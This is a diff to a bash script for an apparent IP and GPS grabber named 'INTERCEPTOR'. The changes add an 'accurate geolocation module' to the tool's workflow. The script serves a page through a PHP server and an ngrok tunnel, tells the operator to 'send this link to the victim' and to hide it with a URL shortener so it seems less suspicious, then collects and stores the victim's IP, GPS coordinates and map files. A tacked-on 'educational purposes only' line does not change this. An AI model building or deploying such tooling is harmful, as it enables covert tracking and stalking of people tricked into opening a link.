@@ -99,7 +99,7 @@ function Database {
     printf "${YELLOW}$banner"
     printf "${GREEN}\n\n[+]${WHITE}LISTING DATABASE FILES..."
     sleep 3
-    for entry in $(ls Database);
+    for entry in $(ls Template/Database);
         do
         printf "\n${GREEN}[+]${WHITE}$entry"
     done
@@ -110,11 +110,11 @@ function Database {
         do
         printf "${GREEN}\n[+]${WHITE}CHECKING IF FILE EXIST...\n"
         sleep 2
-        if [ -f "Database/$File" ]; 
+        if [ -f "Template/Database/$File/$File.txt" ]; 
             then
             printf "${GREEN}\n[+]${WHITE}OPENING FILE $File...\n\n"
             sleep 2
-            reader=$(<"Database/$File")
+            reader=$(<"Template/Database/$File/$File.txt")
             while IFS= read -r line
                 do    
                 echo "${GREEN}[+]${WHITE}$line"
@@ -122,7 +122,21 @@ function Database {
                 then
                 break
             fi
-            done < "Database/$File"
+            done < "Template/Database/$File/$File.txt"
+            fi
+        if [ -f "Template/Database/$File/geo.txt" ]; 
+            then
+            printf "${GREEN}\n[+]${WHITE}OPENING $File GPS FILE...\n\n"
+            sleep 2
+            reader=$(<"Template/Database/$File/geo.txt")
+            while IFS= read -r line
+                do    
+                echo "${GREEN}[+]${WHITE}$line"
+                if [ "$line" == "" ];
+                then
+                break
+            fi
+            done < "Template/Database/$File/geo.txt"
             printf "${GREEN}\n[+]${WHITE}PRESS ENTER TO CONTINUE...\n\n"
             read -p "$YELLOW[INTERCEPTOR]$WHITE-->" Port
             Database
@@ -151,41 +165,60 @@ function Grabber {
         printf "${GREEN}\n[+]${WHITE}INSERT THE REDIRECT-URL\n\n"
         read -p "$YELLOW[INTERCEPTOR]$WHITE-->" Url
     done
-    printf "${GREEN}\n[+]${WHITE}INSERT YOUR SERVER PORT(DEFAULT:6000)\n\n"
+    printf "${GREEN}\n[+]${WHITE}INSERT YOUR SERVER PORT,LEAVE EMPY FOR DEFAULT(DEFAULT:6000)\n\n"
     read -p "$YELLOW[INTERCEPTOR]$WHITE-->" Port
     if [ "$Port" == "" ];
         then
         Port="6000"   
     fi
+    printf "${GREEN}\n[+]${WHITE}WOULD YOU LIKE TO ACTIVATE THE ACCURATE GEOLOCATION MODULE?(1)YES(2)NO\n\n"
+    read -p "$YELLOW[INTERCEPTOR]$WHITE-->" Answ2
+    if [ $Answ2 == 1 ];
+        then
+        cd Template/Temp/
+        echo -n "True">Geo.txt
+        echo -n "../Database/$Victim/geo.txt">Geo2.txt
+        echo -n "../Database/$Victim/geo.html">Geo3.txt
+        cd ../../
+        Geo="True"
+    elif [ $Answ2 == 2 ];
+        then
+        cd Template/Temp/
+        echo -n "False">Geo.txt
+        Geo="False"
+        cd ../../
+    fi
     printf "${GREEN}\n[+]${WHITE}WOULD YOU LIKE TO SAVE THESE VALUES?(1)YES(2)NO"
     printf "${GREEN}\n[+]${WHITE}USERNAME:${YELLOW}$Victim"
     printf "${GREEN}\n[+]${WHITE}REDIRECT-URL:${YELLOW}$Url"
-    printf "${GREEN}\n[+]${WHITE}PORT:${YELLOW}$Port\n\n"
+    printf "${GREEN}\n[+]${WHITE}PORT:${YELLOW}$Port"
+    printf "${GREEN}\n[+]${WHITE}GPS:${YELLOW}$Geo\n\n"
     read -p "$YELLOW[INTERCEPTOR]$WHITE-->" Answ
     if [ $Answ == 2 ];
         then
         Grabber  
     fi
-    cd Temp
-    echo -n "$Victim">User.txt
-    echo -n "$Url">Url.txt
-    cd ../
     printf "${GREEN}\n[+]${WHITE}SAVING OPTIONS..."
     sleep 3
     clear
-    banner=$(<"Banner/Banner3.txt") 
+    banner=$(<"Banner/Banner3.txt")
+    cd Template/Temp/
+    echo -n "$Victim">User.txt
+    echo -n "$Url">Url.txt
+    cd ../../ 
     printf "${YELLOW}$banner"
     printf "${GREEN}\n\n[+]${WHITE}OPTION SAVED:${YELLOW}SUCCESSFULLY"
     printf "${GREEN}\n\n[+]${WHITE}CHECKING ${YELLOW}$Victim ${WHITE}OLD DATA..."
-    file2="Database/$Victim.txt"
+    file2="Template/Database/$Victim/$Victim.txt"
     sleep 2 
     if [ -f $file2 ];
         then
         printf "${GREEN}\n\n[+]${WHITE}OLD DATA FOUND DELETING..."
-        rm $file2
+        rm -rf "Template/Database/$Victim"
     else
         printf "${GREEN}\n\n[+]${WHITE}NO DATA FOUND"
     fi
+    mkdir "Template/Database/$Victim"
     printf "${GREEN}\n\n[+]${WHITE}RUNNING PHP SERVER..."
     sleep 2
     php -S  127.0.0.1:$Port -t Template  >/dev/null 2>&1 &
@@ -197,13 +230,14 @@ function Grabber {
     link=$(curl -s -N http://127.0.0.1:4040/api/tunnels|sed 's#"# #g'|sed 's#http#\nhttp#g'|sed 's#.io#.io\n#g'|grep https|head -n 1)
     #link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
     printf "${GREEN}\n[+]${WHITE}SEND THIS LINK TO THE VICTIM:${YELLOW}$link\n"
-    printf "${GREEN}\n[+]${YELLOW}TIPS:${WHITE}USE A URL SHORTENER FOR MASK THESE URL SO IT MAY SEEM LESS SUSPICIOUS:)"
+    printf "${GREEN}\n[+]${YELLOW}TIPS:${WHITE}USE A URL SHORTENER FOR MASK THESE URL SO IT MAY SEEM LESS SUSPICIOUS:)\n"
+    printf "${GREEN}\n[+]${YELLOW}REMINDER:${WHITE}THIS TOOL HAS BEEN DESIGNED FOR EDUCATIONAL AND TEST PURPOSES ONLY PLEASE USE IT WITH GOOD SENSE:)"
     printf "${GREEN}\n\n[+]${WHITE}WAITING FOR THE VICTIM TO OPEN THE LINK:\n"
     while [ ! -s $file2 ];
         do
         found=0
     done
-    printf "${GREEN}\n[+]${WHITE}VICTIM INFO FOUND:\n"
+    printf "${GREEN}\n[+]${WHITE}IP INFO FOUND:\n"
     sleep 5
     info=$(<"$file2")
     while IFS= read -r line
@@ -214,12 +248,37 @@ function Grabber {
             break
         fi
     done < "$file2"
+    sleep 2
+    if [ $Answ2 == 1 ];
+        then
+        file3="Template/Database/$Victim/geo.txt"
+        while [ ! -s $file3 ];
+            do
+            found=0
+        done
+        printf "${GREEN}\n[+]${WHITE}GPS INFO FOUND:\n"
+        sleep 5
+        info=$(<"$file3")
+        while IFS= read -r line
+            do    
+            echo "${GREEN}[+]${WHITE}$line"
+            if [ "$line" == "" ];
+                then
+                break
+            fi
+        done < "$file3"
+         printf "${GREEN}\n[+]${WHITE}GPS MAP OF${YELLOW} $Victim${WHITE} SAVED ON FOLDER:${YELLOW}Template/Database/${Victim}/geo.html\n"
+    fi
     printf "${GREEN}\n[+]${WHITE}ADDING${YELLOW} $Victim${WHITE} IP ON THE DATABASE...\n"
-    printf "${GREEN}\n[+]${WHITE}IP MAP OF${YELLOW} $Victim${WHITE} SAVED ON FOLDER:${YELLOW}Database/${Victim}_Map.html\n"
+    printf "${GREEN}\n[+]${WHITE}IP MAP OF${YELLOW} $Victim${WHITE} SAVED ON FOLDER:${YELLOW}Template/Database/${Victim}/Map.html\n"
     sleep 4
     printf "${GREEN}\n[+]${WHITE}DELETING OLD SERVER FILE...\n"
     sleep 3
-    rm Temp/User.txt && rm Temp/Url.txt
+    rm Template/Temp/User.txt && rm Template/Temp/Url.txt && rm Template/Temp/Geo.txt
+    if [ $Answ2 == 1 ];
+        then
+        rm Template/Temp/Geo2.txt && rm Template/Temp/Geo3.txt
+    fi
     printf "${GREEN}\n[+]${WHITE}OLD SERVER FILES DELEATED\n"
     printf "${GREEN}\n[+]${WHITE}SHUTTING DOWN SERVER...\n"
     killall  php > /dev/null 2>&1
